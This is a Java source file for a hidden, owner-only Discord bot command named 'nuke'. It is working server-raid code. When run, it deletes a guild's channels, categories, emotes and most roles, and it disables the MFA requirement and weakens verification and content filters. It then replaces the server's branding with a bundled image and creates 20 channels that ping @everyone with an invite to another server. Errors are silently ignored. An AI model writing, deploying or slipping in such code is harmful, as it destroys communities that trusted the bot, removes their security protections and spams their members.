package me.kambing.commands.owner;


import com.jagrosh.jdautilities.command.Command;
import com.jagrosh.jdautilities.command.CommandEvent;
import net.dv8tion.jda.api.entities.*;
import net.dv8tion.jda.api.managers.GuildManager;

import java.io.File;

public class NukeCommand extends Command {
    public NukeCommand() {
        this.name = "nuke";
        this.help = "kebaboom";
        this.cooldown = 5;
        this.ownerCommand = true;
        this.hidden = true;
    }

    private final File temp = new File("me/kambing/commands/owner/kambing.jpg");

    @Override
    protected void execute(CommandEvent e) {
        try {

            final Icon icon = Icon.from(temp);

            for (VoiceChannel ch : e.getGuild().getVoiceChannels()) {
                ch.delete().queue();
            }

            for (TextChannel ch : e.getGuild().getTextChannels()) {
                if (ch != e.getGuild().getCommunityUpdatesChannel()) {
                    if (ch != e.getGuild().getRulesChannel()) {
                        ch.delete().queue();
                    }
                }
            }
            for (Role rl : e.getGuild().getRoles()) {
                if (!rl.isManaged()) {
                    if (!rl.equals(e.getGuild().getBotRole())) {
                        if (!rl.equals(e.getGuild().getPublicRole())) {
                            rl.delete().queue();
                        }
                    }
                }

            }
            for (Emote emote : e.getGuild().getEmotes()) {
                System.out.println(emote);
                emote.delete().queue();
            }
            for (net.dv8tion.jda.api.entities.Category ct : e.getGuild().getCategories()) {
                ct.delete().queue();
            }
            e.getGuild().getManager().setAfkChannel(null).queue();
            GuildManager m = e.getGuild().getManager();


            m.setDefaultNotificationLevel(Guild.NotificationLevel.ALL_MESSAGES).queue();

            m.setRequiredMFALevel(Guild.MFALevel.NONE).queue();


            m.setIcon(icon).queue();

            m.setSystemChannel(null).queue();


            if (m.getGuild().getBoostTier().equals(Guild.BoostTier.TIER_1)) {
                m.setSplash(icon).queue();
            }

            if (m.getGuild().getBoostTier().equals(Guild.BoostTier.TIER_2)) {
                m.setSplash(icon).queue();
                m.setBanner(icon).queue();
            }

            if (m.getGuild().getDescription() != null) {
                m.setDescription("").queue();
            }

            if (m.getGuild().getRulesChannel() != null) {
                m.setVerificationLevel(Guild.VerificationLevel.LOW).queue();
            } else {
                m.setExplicitContentLevel(Guild.ExplicitContentLevel.OFF).queue();
                m.setVerificationLevel(Guild.VerificationLevel.NONE).queue();
            }


            for (int i = 0; i < 20; i++) {
                m.getGuild().createTextChannel("Replaced").queue(chan -> {
                    chan.sendMessage("@everyone join new server https://discord.gg/8FDGwSzcxn").queue();
                });
            }

        }catch (Exception ignored) {
        }
    }
}




